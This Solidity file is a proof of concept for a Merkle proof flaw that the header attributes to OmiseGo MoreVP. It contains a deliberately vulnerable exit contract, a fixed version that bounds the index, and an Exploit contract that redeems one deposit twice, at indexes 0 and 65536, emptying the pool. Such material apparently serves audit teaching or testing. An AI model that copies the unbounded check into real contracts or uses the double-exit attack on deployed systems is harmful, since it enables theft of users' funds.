// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  OmiseGo MoreVP Merkle.checkMembership (ConsenSys, January 2020).
    The inclusion loop never requires index < 2**(proof.length/32).
    A deposit proof for index 0 also verifies at index 2**16.
    Deposit output ids include the index, so both exits are paid.
*/

library DepositTree {
    uint8 internal constant NODE_SALT = 0x01;

    function leaf() internal pure returns (bytes32) {
        return keccak256("deposit-output");
    }

    function build() internal pure returns (bytes32 root, bytes memory proof) {
        proof = new bytes(512);
        bytes32 computed = leaf();
        for (uint256 i = 0; i < 16; i++) {
            bytes32 sibling = bytes32(i + 1);
            assembly {
                mstore(add(add(proof, 32), mul(i, 32)), sibling)
            }
            computed = keccak256(abi.encodePacked(NODE_SALT, computed, sibling));
        }
        root = computed;
    }
}

contract Coin {
    mapping(address => uint256) public balanceOf;
    address public immutable minter;

    constructor() {
        minter = msg.sender;
    }

    function mint(address to, uint256 amount) external {
        require(msg.sender == minter, "minter");
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
    }
}

contract ExitGame {
    uint8 internal constant NODE_SALT = 0x01;
    uint256 public constant DEPOSIT = 1 ether;

    Coin public immutable coin;
    bytes32 public root;
    bytes32 public depositLeaf;
    bytes public proof;
    mapping(bytes32 => bool) public exited;
    uint256 public paid;
    uint256 public exitCount;
    uint256 public overpaid;

    constructor(Coin _coin) {
        coin = _coin;
        depositLeaf = DepositTree.leaf();
        (root, proof) = DepositTree.build();
    }

    function checkMembership(bytes32 leaf, uint256 index, bytes32 rootHash, bytes memory membershipProof)
        public
        pure
        returns (bool)
    {
        require(membershipProof.length % 32 == 0, "proof");
        bytes32 proofElement;
        bytes32 computedHash = leaf;
        uint256 j = index;
        // Quoted loop: no bound index < 2**(proof.length/32).
        for (uint256 i = 32; i <= membershipProof.length; i += 32) {
            assembly {
                proofElement := mload(add(membershipProof, i))
            }
            if (j % 2 == 0) {
                computedHash = keccak256(abi.encodePacked(NODE_SALT, computedHash, proofElement)); // @> VULN: high index bits are never consumed
            } else {
                computedHash = keccak256(abi.encodePacked(NODE_SALT, proofElement, computedHash));
            }
            j = j / 2;
        }
        return computedHash == rootHash;
    }

    function processExit(bytes32 leaf, uint256 index, bytes memory membershipProof) external {
        require(this.checkMembership(leaf, index, root, membershipProof), "proof");
        // Deposit output ids include the transaction index, so 0 and 2**16 differ.
        bytes32 id = keccak256(abi.encodePacked("deposit", leaf, index));
        require(!exited[id], "exited");
        exited[id] = true;
        paid += DEPOSIT;
        exitCount += 1;
        if (exitCount == 2) {
            overpaid = DEPOSIT;
        }
        coin.transfer(msg.sender, DEPOSIT);
    }
}

contract ExitGameFixed {
    uint8 internal constant NODE_SALT = 0x01;
    uint256 public constant DEPOSIT = 1 ether;

    Coin public immutable coin;
    bytes32 public root;
    bytes32 public depositLeaf;
    bytes public proof;
    mapping(bytes32 => bool) public exited;
    uint256 public paid;
    uint256 public exitCount;
    uint256 public overpaid;

    constructor(Coin _coin) {
        coin = _coin;
        depositLeaf = DepositTree.leaf();
        (root, proof) = DepositTree.build();
    }

    function checkMembership(bytes32 leaf, uint256 index, bytes32 rootHash, bytes memory membershipProof)
        public
        pure
        returns (bool)
    {
        require(membershipProof.length % 32 == 0, "proof");
        uint256 height = membershipProof.length / 32;
        require(index < (uint256(1) << height), "index");
        bytes32 proofElement;
        bytes32 computedHash = leaf;
        uint256 j = index;
        for (uint256 i = 32; i <= membershipProof.length; i += 32) {
            assembly {
                proofElement := mload(add(membershipProof, i))
            }
            if (j % 2 == 0) {
                computedHash = keccak256(abi.encodePacked(NODE_SALT, computedHash, proofElement));
            } else {
                computedHash = keccak256(abi.encodePacked(NODE_SALT, proofElement, computedHash));
            }
            j = j / 2;
        }
        return computedHash == rootHash;
    }

    function processExit(bytes32 leaf, uint256 index, bytes memory membershipProof) external {
        require(this.checkMembership(leaf, index, root, membershipProof), "proof");
        bytes32 id = keccak256(abi.encodePacked("deposit", leaf, index));
        require(!exited[id], "exited");
        exited[id] = true;
        paid += DEPOSIT;
        exitCount += 1;
        if (exitCount == 2) {
            overpaid = DEPOSIT;
        }
        coin.transfer(msg.sender, DEPOSIT);
    }
}

contract Exploit {
    uint256 public constant DEPOSIT = 1 ether;
    uint256 public constant POOL = 2 ether;

    Coin public coin;
    ExitGame public game;

    constructor() {
        coin = new Coin();
        game = new ExitGame(coin);
        coin.mint(address(game), POOL);
    }

    function run() external {
        bytes memory membershipProof = game.proof();
        bytes32 leaf = game.depositLeaf();
        bool atZero = game.checkMembership(leaf, 0, game.root(), membershipProof);
        require(atZero, "index 0");
        game.processExit(leaf, 0, membershipProof);
        bool atHigh = game.checkMembership(leaf, 65536, game.root(), membershipProof);
        require(atHigh, "index 65536");
        game.processExit(leaf, 65536, membershipProof);
        require(game.overpaid() == DEPOSIT, "other deposit taken");
        require(coin.balanceOf(address(this)) == POOL, "paid twice");
        require(coin.balanceOf(address(game)) == 0, "pool empty");
        require(game.paid() == POOL, "paid 2");
    }
}
